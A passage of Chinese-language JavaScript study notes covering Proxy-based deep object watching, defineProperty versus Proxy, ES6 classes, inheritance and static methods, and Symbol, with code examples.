<span class="token keyword">let</span> proxy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
proxy<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">&quot;李四&quot;</span><span class="token punctuation">;</span>
proxy<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">24</span><span class="token punctuation">;</span>
<span class="token comment">// set name 李四</span>
<span class="token comment">// set age 24</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>涉及到多级对象或者多级数组</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>  <span class="token comment">//传递两个参数，一个是object, 一个是proxy的handler</span>
  <span class="token comment">//如果是不是嵌套的object，直接加上proxy返回，如果是嵌套的object，那么进入addSubProxy进行递归。 </span>
  <span class="token keyword">function</span> <span class="token function">toDeepProxy</span><span class="token punctuation">(</span><span class="token parameter">object<span class="token punctuation">,</span> handler</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isPureObject</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">addSubProxy</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//这是一个递归函数，目的是遍历object的所有属性，如果不是pure object,那么就继续遍历object的属性的属性，如果是pure object那么就加上proxy</span>
    <span class="token keyword">function</span> <span class="token function">addSubProxy</span><span class="token punctuation">(</span><span class="token parameter">object<span class="token punctuation">,</span> handler</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> prop <span class="token keyword">in</span> object<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> object<span class="token punctuation">[</span>prop<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isPureObject</span><span class="token punctuation">(</span>object<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">addSubProxy</span><span class="token punctuation">(</span>object<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
          object<span class="token punctuation">[</span>prop<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>object<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
      object <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> handler<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//是不是一个pure object,意思就是object里面没有再嵌套object了</span>
    <span class="token keyword">function</span> <span class="token function">isPureObject</span><span class="token punctuation">(</span><span class="token parameter">object</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> object <span class="token operator">!==</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> prop <span class="token keyword">in</span> object<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> object<span class="token punctuation">[</span>prop<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><h5 id="比较区别-2"><a href="#比较区别-2" class="header-anchor">#</a> 比较区别</h5> <p>1.defineProterty是es5的标准,proxy是es6的标准;</p> <p>2.<strong>proxy可以监听到数组索引赋值,改变数组长度的变化</strong>;</p> <p>3.<strong>proxy是监听对象,不用深层遍历</strong>,defineProterty是<strong>监听属性</strong>;</p> <p>4.<strong>利用defineProterty实现双向数据绑</strong>定(<code>vue2.x采用的核心</code>)</p> <p>5.<strong>利用proxy实现双向数据绑定</strong>(<code>vue3.x会采用</code>)</p> <h3 id="es6-class-symbol"><a href="#es6-class-symbol" class="header-anchor">#</a> ES6/class/Symbol</h3> <h4 id="_1-es6总括"><a href="#_1-es6总括" class="header-anchor">#</a> 1:ES6总括</h4> <blockquote><p><strong>ECMAScript 5 (ES5)</strong>：ECMAScript 的第五版，于2009年标准化，该标准已在所有现代浏览器中完全支持。</p> <p><strong>ECMAScript 6 (ES6)/ ECMAScript 2015 (ES2015)</strong>:ECMAscript 第 6 版，2015 年标准化。这个标准已经在大多数现代浏览器中部分实现。</p> <p>用正确的概念来说ES6目前涵盖了<strong>ES2015</strong>、<strong>ES2016</strong>、<strong>ES2017</strong>、<strong>ES2018</strong>、<strong>ES2019</strong>。</p></blockquote> <p>ES6更新的内容主要分为以下几点</p> <ul><li><strong>表达式</strong>：声明、解构赋值</li> <li><strong>内置对象</strong>：
<ul><li>字符串扩展、数值扩展、对象扩展、数组扩展、函数扩展、正则扩展</li> <li>Symbol、Set、Map、Proxy、Reflect</li></ul></li> <li><strong>语句与运算</strong>：Class、Module、Iterator</li> <li><strong>异步编程</strong>：Promise、Generator、Async</li></ul> <p><img src="/rat-summ/assets/img/10-18-43.a7fefb71.jpg" alt="10-18-43"></p> <h4 id="_2-面向对象"><a href="#_2-面向对象" class="header-anchor">#</a> 2:面向对象</h4> <blockquote><p>相比较函数，面向对象是 <strong>更大的封装</strong>，根据 <strong>职责</strong> 在 一个对象中 <strong>封装</strong> 多个方法</p></blockquote> <ul><li>概念
<ul><li>在完成某一个需求前，首先确定 <strong>职责</strong> —— 要做的事情（方法）</li> <li>根据 <strong>职责</strong> 确定不同的 <strong>对象</strong>，在 <strong>对象</strong> 内部封装不同的 <strong>方法</strong>（多个）</li> <li>最后完成的代码，就是顺序地让 <strong>不同的对象</strong> <strong>调用</strong> 不同的方法</li></ul></li> <li>特点
<ul><li>注重 <strong>对象和职责</strong>，不同的对象承担不同的职责</li> <li>更加适合应对复杂的需求变化，是专门应对复杂项目开发，提供的固定套路</li> <li>需要在面向过程基础上，再学习一些面向对象的语法</li></ul></li></ul> <p>一种程序设计方式；<strong>把职责在一个对象中封装多个方法，比面向过程更注重对象和职责；</strong></p> <p>面向对象的<strong>三大特性：封装，继承，多态</strong>；</p> <ul><li>封装：根据职责将属性和方法封装到一个抽象的 类 中；</li> <li>继承：实现代码的重用，相同的代码不需要重复的编写；</li> <li>多态：不同的子类对象调用相同的父类方法，产生不同的执行结果；</li></ul> <h4 id="_3-class-和传统构造函数比较"><a href="#_3-class-和传统构造函数比较" class="header-anchor">#</a> 3:Class 和传统构造函数比较</h4> <blockquote><h5 id="选择使用类的一些原因"><a href="#选择使用类的一些原因" class="header-anchor">#</a> 选择使用类的一些原因</h5></blockquote> <p>**原理：**类本身指向构造函数，<strong>所有方法定义在<code>prototype</code>上，可看作构造函数的另一种写法</strong>(<code>Class === Class.prototype.constructor</code>)；</p> <p>值得一提的是，<code>class</code>本质也是<code>function</code>，<code>class</code>是<code>function</code>的<code>语法糖</code></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> Person<span class="token punctuation">)</span> <span class="token comment">// function</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>比较：</p> <ul><li>Class 在语法上更加贴合面向对象的写法</li> <li>Class 实现继承更加易读、易理解，对初学者更加友好</li> <li><strong>本质还是语法糖，使用prototype</strong></li> <li><strong>用新语法调用父原型方法的版本比旧语法要简单得多</strong>，用<code>super.method()</code>代替<code>Parent.prototype.method.call(this)</code> 或<code>Object.getPrototypeOf(Object.getPrototypeOf(this)).method.call(this)</code></li> <li>使用新语法比使用旧语法<strong>更容易(而且更不易出错)地设置继承层次结构</strong>。</li> <li><code>class</code>可以避免构造函数中使用new的常见错误（如果构造函数不是有效的对象，则使构造函数抛出异常）。</li></ul> <p><img src="/rat-summ/assets/img/image-20211031020347203.87e1a9df.png" alt="image-20211031020347203"></p> <p>类的数据类型就是function，类本身就指向构造函数。<strong>构造函数的prototype属性，在ES6的“类”上面继续存在</strong>。</p> <p>类的所有方法<strong>都定义在类的prototype属性上面</strong>。另外，<strong>类的内部所有定义的方法，都是不可枚举的.</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">Point</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">x<span class="token punctuation">,</span> y</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> x<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> y<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token string">'('</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">+</span> <span class="token string">', '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">+</span> <span class="token string">')'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// 可以这么改写</span>
<span class="token keyword">function</span> <span class="token function">Point</span><span class="token punctuation">(</span><span class="token parameter">x<span class="token punctuation">,</span> y</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> x<span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> y<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token class-name">Point</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">toString</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token string">'('</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">+</span> <span class="token string">', '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">+</span> <span class="token string">')'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">Point</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// ...}</span>
  <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// ... }</span>
  <span class="token function">toValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// ...}</span>
<span class="token punctuation">}</span>
    
<span class="token comment">// 等同于;要拆分开来，不能完全写成对象模式；这样会修改到原型链；</span>
<span class="token class-name">Point</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function">toValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
b<span class="token punctuation">.</span>constructor <span class="token operator">===</span> <span class="token class-name">B</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token comment">// true 也是原型链规则；</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>toString方法是类内部定义的方法，它是不可枚举的(for in 及keys获取不到)。<strong>跟与ES5的行为不一致</strong>；【一级对象遍历方法】</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token class-name">Point</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token comment">// []</span>
Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span><span class="token class-name">Point</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token comment">// [&quot;constructor&quot;,&quot;toString&quot;]；跟与ES5的行为不一致</span>

<span class="token keyword">var</span> <span class="token function-variable function">Point</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">x<span class="token punctuation">,</span> y</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// ...};</span>
<span class="token class-name">Point</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">toString</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// ...};</span>
Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token class-name">Point</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
<span class="token comment">// [&quot;toString&quot;]</span>
Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span><span class="token class-name">Point</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
<span class="token comment">// [&quot;constructor&quot;,&quot;toString&quot;]</span>
<span class="token comment">//上面代码采用 ES5 的写法，toString方法就是可枚举的。</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h4 id="_4-class-和-function-不同点"><a href="#_4-class-和-function-不同点" class="header-anchor">#</a> 4:Class 和 function 不同点</h4> <ol><li><p><strong>类没有变量提升</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token comment">// Uncaught ReferenceError: B is not defined</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div></li> <li><p><strong>类的所有方法，都不可枚举</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">static</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">'samy'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token constant">A</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// []</span>
Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token class-name">A</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// []</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div></li> <li><p><strong>类的的所有方法，没有原型对象<code>prototype</code></strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//接上例子；</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">A</span><span class="token punctuation">.</span>say<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>print<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div></li> <li><p><strong>类不能直接使用，必须使用 new 调用。</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token constant">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//接上例// Uncaught TypeError: Class constructor A cannot be invoked without 'new'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div></li> <li><p><strong>类内部启用严格模式</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token punctuation">{</span>
    x <span class="token operator">=</span> <span class="token number">1</span>
<span class="token punctuation">}</span><span class="token comment">// Uncaught SyntaxError: Identifier 'B' has already been declared</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div></li></ol> <h4 id="_5-继承实质区别【要点】"><a href="#_5-继承实质区别【要点】" class="header-anchor">#</a> 5:继承实质区别【要点】</h4> <p>无非就是<strong>是否先创建子类this,或者将父类的属性方法添加到this上；</strong></p> <ul><li><strong>ES5实质</strong>：先创造子类实例的<code>this</code>，再将父类的属性方法添加到<code>this</code>上(<code>继承赋值处理</code>)；</li> <li><strong>ES6实质</strong>：先将父类实例的属性方法加到<code>this</code>上(调用<code>super()</code>)，再用子类构造函数修改<code>this</code>；</li></ul> <p><strong>属性</strong></p> <ul><li><strong><code>__proto__</code></strong>：<code>构造函数的继承</code>(总是指向<code>父类</code>)</li> <li><strong><code>__proto__.__proto__</code></strong>：子类的原型的原型，即父类的原型(总是指向父类的<code>__proto__</code>)</li> <li><strong><code>prototype.__proto__</code></strong>：<code>属性方法的继承</code>(总是指向父类的<code>prototype</code>)</li></ul> <p><strong>静态属性</strong>：定义类完成后赋值属性，该属性<code>不会被实例继承</code>，只能通过类来调用</p> <p><strong>静态方法</strong>：使用<code>static</code>定义方法，该方法<code>不会被实例继承</code>，只能通过类来调用(方法中的<code>this</code>指向类，而不是实例)</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">/</span>定义一个子类
<span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age<span class="token punctuation">,</span> salary</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> age<span class="token punctuation">)</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>salary <span class="token operator">=</span> salary
  <span class="token punctuation">}</span>
  <span class="token function">showName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//在子类自身定义方法</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;调用子类的方法&quot;</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//wade 38 1000000000</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h4 id="_6-类的set-get和静态方法-decorator"><a href="#_6-类的set-get和静态方法-decorator" class="header-anchor">#</a> 6:类的set/get和静态方法/Decorator</h4> <ul><li><p>与ES5一样，在Class内部可以使用get和set关键字，对某个属性设置存值函数和取值函数，拦截该属性的存取行为；</p></li> <li><p>在一个方法前加上static关键字，<strong>就表示该方法不会被实例继承，而是直接通过类来调用</strong>，这就称为“静态方法”。<strong>静态属性/方法</strong>：就是<strong>不需要实例化类，就能直接调用的 属性/方法</strong>；</p></li> <li><p>修饰器是一个用来修改类的行为的函数。<strong>其对类的行为的改变，是代码编译时发生的，而不是在运行时</strong>;</p> <p>修饰器不仅可以修饰类，还可以修饰类的属性,修饰器只能用于类和类的方法，不能用于函数，因为存在函数提升。<strong>如果同一个方法有多个修饰器，会像剥洋葱一样，先从外到内进入，然后由内向外执行。</strong></p> <p>修饰类的属性时，<strong>修饰器函数一共可以接受三个参数</strong>，</p> <ul><li>第一个参数是所要修饰的目标对象target;</li> <li>第二个参数是所要修饰的属性名name;</li> <li>第三个参数是该属性的描述对象descriptor;</li></ul></li></ul> <h4 id="_7-方法和关键字"><a href="#_7-方法和关键字" class="header-anchor">#</a> 7:方法和关键字</h4> <ul><li><strong>constructor()</strong>：构造函数，<code>new命令</code>生成实例时自动调用
<ul><li>constructor内定义的方法和属性是实例对象自己的</li> <li><strong>constructor外定义的方法和属性则是所有实例对象可以共享的</strong></li></ul></li> <li><strong>extends</strong>：继承父类</li> <li><strong>super</strong>：新建父类的<code>this</code></li> <li><strong>static</strong>：定义静态属性方法</li> <li><strong>get</strong>：取值函数，拦截属性的取值行为</li> <li><strong>set</strong>：存值函数，拦截属性的存值行为</li></ul> <h4 id="_8-symbol定义及用法"><a href="#_8-symbol定义及用法" class="header-anchor">#</a> 8:Symbol定义及用法</h4> <p><code>Symbol</code> 是JS新的基本数据类型。与<code>number</code>、<code>string</code>和<code>boolean</code> 原始类型一样，<code>Symbol</code> 也有一个用于创建它们的函数。<strong>与其他原始类型不同，<code>Symbol</code>没有字面量语法</strong>。是一种数据类型; 不能new, <strong>因为Symbol是一个原始类型的值，不是对象</strong>。</p> <p><strong>使用 <code>Symbol</code> 替换<code>string</code>可以避免不同的模块属性的冲突</strong>。还<strong>可以将<code>Symbol</code>设置为私有</strong>，以便尚无直接访问<code>Symbol</code>权限的任何人都不能访问它们的属性。</p> <p>Symbol(),可以传参</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 有参数的情况</span>
<span class="token keyword">var</span> s1 <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">&quot;foo&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> s2 <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">&quot;foo&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s1 <span class="token operator">===</span> s2 <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//false</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Symbol(foo)</span>

<span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> name <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
a<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'samy'</span><span class="token punctuation">;</span>
a<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'zh'</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>name<span class="token punctuation">,</span>a<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//samy zh</span>
